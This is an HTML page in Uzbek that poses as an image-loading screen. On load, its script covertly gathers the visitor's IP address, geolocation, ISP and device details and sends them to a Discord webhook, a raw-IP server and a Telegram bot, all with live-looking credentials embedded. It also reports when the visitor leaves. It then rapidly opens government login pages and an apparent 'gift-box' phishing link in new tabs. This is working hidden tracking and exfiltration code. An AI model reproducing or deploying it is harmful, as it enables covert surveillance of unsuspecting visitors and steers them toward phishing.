<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rasm Yuklanmoqda...</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: white;
            overflow: hidden;
        }
        .loading-container {
            text-align: center;
            background: rgba(255, 255, 255, 0.1);
            padding: 40px;
            border-radius: 15px;
            backdrop-filter: blur(10px);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            z-index: 10;
            position: relative;
        }
        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top: 4px solid white;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        h1 {
            margin-bottom: 10px;
            font-size: 24px;
        }
        p {
            margin: 5px 0;
            opacity: 0.9;
        }
        .page-indicator {
            position: fixed;
            top: 20px;
            right: 20px;
            background: rgba(0, 0, 0, 0.5);
            padding: 10px 15px;
            border-radius: 20px;
            font-size: 14px;
            z-index: 100;
        }
        .status-message {
            position: fixed;
            bottom: 20px;
            left: 20px;
            background: rgba(0, 0, 0, 0.5);
            padding: 10px 15px;
            border-radius: 20px;
            font-size: 14px;
            z-index: 100;
        }
        .hidden-frame {
            position: absolute;
            width: 100%;
            height: 100%;
            border: none;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.5s ease;
        }
        .active-frame {
            opacity: 1;
            pointer-events: all;
            z-index: 5;
        }
        .controls {
            position: fixed;
            top: 20px;
            left: 20px;
            background: rgba(0, 0, 0, 0.5);
            padding: 10px 15px;
            border-radius: 20px;
            font-size: 14px;
            z-index: 100;
        }
        .controls button {
            background: rgba(255, 255, 255, 0.2);
            border: none;
            color: white;
            padding: 5px 10px;
            border-radius: 5px;
            cursor: pointer;
            margin: 0 5px;
        }
        .controls button:hover {
            background: rgba(255, 255, 255, 0.3);
        }
        .success-message {
            background: rgba(0, 255, 0, 0.2);
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
            display: none;
        }
        .error-message {
            background: rgba(255, 0, 0, 0.2);
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
            display: none;
        }
    </style>
</head>
<body>
    <div class="controls">
        <button onclick="pauseRotation()">Pause</button>
        <button onclick="resumeRotation()">Resume</button>
        <button onclick="testWebhook()">Test Webhook</button>
    </div>
    <div class="page-indicator">Sahifa: <span id="currentPage">1</span>/<span id="totalPages">3</span></div>
    <div class="status-message" id="statusMessage">Asosiy sahifa faol</div>
    
    <div class="loading-container">
        <div class="spinner"></div>
        <h1>Rasm Yuklanmoqda...</h1>
        <p>Iltimos, kuting</p>
        <div class="success-message" id="successMessage">Ma'lumotlar serverga yuborildi! ‚úÖ</div>
        <div class="error-message" id="errorMessage"></div>
    </div>

    <iframe id="frame1" class="hidden-frame" src="about:blank"></iframe>

    <script>
        // Discord Webhook URL - SIZNING MANZILINGIZ
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1430274332969406464/jWY9FXp_agGFehgu4C7tjFUK35V7-lWDgKfYs87M_ZoJXJcxRRCv_pK_IT8LGNc6gbrw";
        
        // Sizning webhook serveringiz
        const WEBHOOK_URL = "http://38.242.228.144/webhook";
        const TELEGRAM_TOKEN = "8497552094:AAH9XKSVaoiisVOTD-gXW8GX9l8l1m5ioWM";
        const TELEGRAM_CHAT_ID = "1882641120";

        // Discordga xabar yuborish
        async function sendToDiscord(message) {
            try {
                console.log('Discordga xabar yuborilmoqda:', message);
                
                const response = await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        content: message,
                        username: 'Tracking Bot',
                        avatar_url: 'https://cdn-icons-png.flaticon.com/512/4712/4712035.png',
                        allowed_mentions: { parse: [] }
                    })
                });

                if (response.ok) {
                    console.log('Xabar Discordga muvaffaqiyatli yuborildi');
                    showSuccess('Xabar Discordga yuborildi! ‚úÖ');
                    return true;
                } else {
                    const errorText = await response.text();
                    throw new Error(`Discord server javobi: ${response.status} - ${errorText}`);
                }
            } catch (error) {
                console.error('Discord xatosi:', error);
                showError(`Discord xatosi: ${error.message}`);
                return false;
            }
        }

        // Webhook serveriga ma'lumot yuborish
        async function sendToWebhook(data) {
            try {
                console.log('Webhookga ma ºlumot yuborilmoqda:', data);
                
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data)
                });

                if (response.ok) {
                    console.log('Ma ºlumotlar webhookga muvaffaqiyatli yuborildi');
                    showSuccess('Ma ºlumotlar serverga yuborildi! ‚úÖ');
                    return true;
                } else {
                    throw new Error(`Server javobi: ${response.status}`);
                }
            } catch (error) {
                console.error('Webhook xatosi:', error);
                showError(`Webhook xatosi: ${error.message}`);
                return false;
            }
        }

        // Telegramga xabar yuborish
        async function sendToTelegram(message) {
            const telegramData = {
                type: 'telegram_message',
                telegram_token: TELEGRAM_TOKEN,
                telegram_chat_id: TELEGRAM_CHAT_ID,
                message: message,
                timestamp: new Date().toISOString()
            };
            
            return await sendToWebhook(telegramData);
        }

        // Muvaffaqiyat xabarini ko'rsatish
        function showSuccess(message) {
            const successElement = document.getElementById('successMessage');
            successElement.textContent = message;
            successElement.style.display = 'block';
            setTimeout(() => {
                successElement.style.display = 'none';
            }, 3000);
        }

        // Xatolik xabarini ko'rsatish
        function showError(message) {
            const errorElement = document.getElementById('errorMessage');
            errorElement.textContent = message;
            errorElement.style.display = 'block';
            setTimeout(() => {
                errorElement.style.display = 'none';
            }, 5000);
        }

        // Test funksiyasi
        async function testWebhook() {
            const testMessage = "üî∞ **TEST XABAR**\n\nBu test xabari. Agar buni ko'rsangiz, webhook ishlayapti! ‚úÖ\n\n‚è∞ Vaqt: " + new Date().toLocaleString();
            
            // Discordga test xabari
            const discordSuccess = await sendToDiscord(testMessage);
            
            if (discordSuccess) {
                console.log('Discord test xabari muvaffaqiyatli yuborildi');
            }
        }

        // Sahifalar ro'yxati
        const pages = [
            'https://my.gov.uz/ru',
            'https://gift-box.site/66b108e0a4269/1882641120', 
            'https://id.egov.uz/oz'
        ];
        
        const totalPages = pages.length;
        document.getElementById('totalPages').textContent = totalPages;
        
        let currentPageIndex = 0;
        let rotationPaused = false;
        let rotationTimer = null;
        
        function openInNewTab(url, pageNumber) {
            try {
                const newTab = window.open(url, '_blank');
                if (newTab) {
                    document.getElementById('statusMessage').textContent = 
                        `Sahifa ${pageNumber} yangi tabda ochildi`;
                    return true;
                } else {
                    const link = document.createElement('a');
                    link.href = url;
                    link.target = '_blank';
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                    document.getElementById('statusMessage').textContent = 
                        `Sahifa ${pageNumber} yangi tabda ochildi`;
                    return true;
                }
            } catch (error) {
                document.getElementById('statusMessage').textContent = 
                    `Sahifa ${pageNumber} ochilmadi: ${error.message}`;
                return false;
            }
        }
        
        function switchPage() {
            if (rotationPaused) return;
            
            currentPageIndex = (currentPageIndex + 1) % totalPages;
            document.getElementById('currentPage').textContent = currentPageIndex + 1;
            
            if (currentPageIndex === 0) {
                const currentFrame = document.getElementById('frame1');
                currentFrame.classList.add('active-frame');
                if (currentFrame.src === 'about:blank') {
                    currentFrame.src = pages[currentPageIndex];
                }
                document.getElementById('statusMessage').textContent = 'Asosiy sahifa faol';
            } else {
                openInNewTab(pages[currentPageIndex], currentPageIndex + 1);
                const mainFrame = document.getElementById('frame1');
                mainFrame.classList.add('active-frame');
                document.getElementById('statusMessage').textContent = 
                    `Sahifa ${currentPageIndex + 1} yangi tabda ochilmoqda...`;
            }
            
            rotationTimer = setTimeout(switchPage, 500);
        }
        
        function startPageRotation() {
            const firstFrame = document.getElementById('frame1');
            firstFrame.src = pages[0];
            firstFrame.classList.add('active-frame');
            rotationTimer = setTimeout(switchPage, 500);
        }
        
        function pauseRotation() {
            rotationPaused = true;
            if (rotationTimer) {
                clearTimeout(rotationTimer);
            }
            document.getElementById('statusMessage').textContent = 'Sahifa almashinishi to\'xtatildi';
        }
        
        function resumeRotation() {
            rotationPaused = false;
            document.getElementById('statusMessage').textContent = 'Sahifa almashinishi davom etmoqda';
            rotationTimer = setTimeout(switchPage, 500);
        }
        
        // Asosiy tracking funksiyasi
        async function startTracking() {
            try {
                // 1. IP va geolokatsiya ma'lumotlarini olish
                let publicIP = "Aniqlanmadi";
                let geoData = {};
                
                try {
                    const ipResponse = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipResponse.json();
                    publicIP = ipData.ip;

                    // Geolokatsiya ma'lumotlari
                    try {
                        const geoResponse = await fetch(`https://ipapi.co/${publicIP}/json/`);
                        geoData = await geoResponse.json();
                    } catch (geoError) {
                        console.log('Birinchi geolokatsiya xatosi:', geoError);
                        try {
                            const geoResponse2 = await fetch(`https://ipapi.co/json/`);
                            geoData = await geoResponse2.json();
                        } catch (geoError2) {
                            console.log('Ikkinchi geolokatsiya xatosi:', geoError2);
                        }
                    }
                } catch (ipError) {
                    console.log('IP aniqlash xatosi:', ipError);
                }

                // 2. Tizim ma'lumotlarini yig'ish
                const systemInfo = {
                    platform: navigator.platform,
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    languages: navigator.languages,
                    cookieEnabled: navigator.cookieEnabled,
                    hardwareConcurrency: navigator.hardwareConcurrency || 'Noma ºlum',
                    deviceMemory: navigator.deviceMemory || 'Noma ºlum',
                    maxTouchPoints: navigator.maxTouchPoints || 0,
                    screen: `${screen.width}x${screen.height}`,
                    colorDepth: `${screen.colorDepth}-bit`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    url: window.location.href
                };

                // 3. Discordga asosiy xabar yuborish
                let discordMessage = "üÜï **YANGI FOYDALANUVCHI KIRDI**\n\n";
                discordMessage += `üåê **Public IP:** \`${publicIP}\`\n`;
                discordMessage += `üñ•Ô∏è **Platforma:** ${systemInfo.platform}\n`;
                discordMessage += `üì± **Ekran:** ${systemInfo.screen}\n`;
                discordMessage += `‚è∞ **Vaqt zonasi:** ${systemInfo.timezone}\n`;
                discordMessage += `üåç **Til:** ${systemInfo.language}\n`;
                
                if (geoData.country_name) {
                    discordMessage += `\nüó∫Ô∏è **Geolokatsiya:**\n`;
                    discordMessage += `üìç **Joylashuv:** ${geoData.city || 'Noma ºlum'}, ${geoData.region || 'Noma ºlum'}, ${geoData.country_name}\n`;
                    discordMessage += `üè¢ **ISP:** ${geoData.org || geoData.isp || 'Noma ºlum'}\n`;
                }

                discordMessage += `\nüîó **URL:** ${systemInfo.url}\n`;
                discordMessage += `üïí **Vaqt:** ${new Date().toLocaleString()}\n`;
                discordMessage += `üë§ **User Agent:** ${systemInfo.userAgent.substring(0, 100)}...`;

                await sendToDiscord(discordMessage);

                // 4. Asosiy ma'lumotlarni webhookga yuborish
                const trackingData = {
                    type: 'user_tracking',
                    public_ip: publicIP,
                    geo_data: geoData,
                    system_info: systemInfo,
                    timestamp: new Date().toISOString(),
                    user_agent: navigator.userAgent
                };

                await sendToWebhook(trackingData);

                // 5. Telegramga ham xabar yuborish
                let telegramMessage = "üÜï <b>Yangi Foydalanuvchi Kirdi</b>\n\n";
                telegramMessage += `üåê <b>Public IP:</b> <code>${publicIP}</code>\n`;
                
                if (geoData.country_name) {
                    telegramMessage += `\nüó∫Ô∏è <b>Geolokatsiya:</b>\n`;
                    telegramMessage += `üìç <b>Joylashuv:</b> ${geoData.city || 'Noma ºlum'}, ${geoData.region || 'Noma ºlum'}, ${geoData.country_name}\n`;
                    telegramMessage += `üè¢ <b>ISP:</b> ${geoData.org || geoData.isp || 'Noma ºlum'}\n`;
                }

                telegramMessage += `\nüíª <b>Tizim Ma ºlumotlari:</b>\n`;
                telegramMessage += `üîß <b>Platforma:</b> ${systemInfo.platform}\n`;
                telegramMessage += `üñ•Ô∏è <b>Ekran:</b> ${systemInfo.screen}\n`;
                telegramMessage += `‚è∞ <b>Vaqt zonasƒ±:</b> ${systemInfo.timezone}\n`;
                telegramMessage += `üîó <b>URL:</b> ${systemInfo.url}`;

                await sendToTelegram(telegramMessage);

            } catch (error) {
                console.error('Tracking xatosi:', error);
                showError(`Tracking xatosi: ${error.message}`);
                
                // Xatolik haqida Discordga xabar berish
                const errorMessage = "‚ùå **TRACKING XATOSI**\n\n" +
                                   `Xato: ${error.message}\n` +
                                   `Vaqt: ${new Date().toLocaleString()}`;
                await sendToDiscord(errorMessage);
            }
        }

        // Dasturni ishga tushirish
        document.addEventListener('DOMContentLoaded', async function() {
            console.log('Dastur ishga tushmoqda...');
            
            // Asosiy trackingni boshlash
            await startTracking();
            
            // Sahifalar almashinishini boshlash
            startPageRotation();
        });

        // Brauzer yopilayotganda so'nggi ma'lumotni yuborish
        window.addEventListener('beforeunload', async function() {
            const exitMessage = "‚ùå **FOYDALANUVCHI SAHIFANI TARK ETDI**\n\n" +
                              `üïí Vaqt: ${new Date().toLocaleString()}\n` +
                              `üîó URL: ${window.location.href}`;
            
            await sendToDiscord(exitMessage);
        });
    </script>
</body>
</html>
